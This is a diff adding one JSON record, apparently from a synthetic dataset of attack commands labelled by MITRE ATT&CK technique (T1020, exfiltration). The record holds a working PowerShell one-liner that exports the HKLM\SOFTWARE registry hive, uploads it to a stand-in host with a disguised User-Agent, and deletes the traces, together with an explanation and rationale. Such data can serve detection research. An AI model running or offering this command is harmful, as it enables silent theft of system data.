@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $d=Join-Path $env:TEMP ('soft_'+(Get-Date -Format yyyyMMddHHmmss)+'.reg'); reg.exe export HKLM\\SOFTWARE $d /y > $null 2>&1; Invoke-WebRequest -Uri 'https://data.example.com/v1/upload/reg' -Method Post -InFile $d -ContentType 'application/octet-stream' -Headers @{ 'User-Agent'='Mozilla/5.0' } -ErrorAction SilentlyContinue; Remove-Item $d -Force",
+  "explanation": "Exports the HKLM\\SOFTWARE hive to a temp file and exfiltrates it via HTTPS POST, suppressing console output and progress.",
+  "rationale_steps": [
+    "Export a high-value registry hive using SYSTEM privileges.",
+    "Upload the resulting file with Invoke-WebRequest POST.",
+    "Redirect command output, suppress progress, and clean up."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-e2d17a4d",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
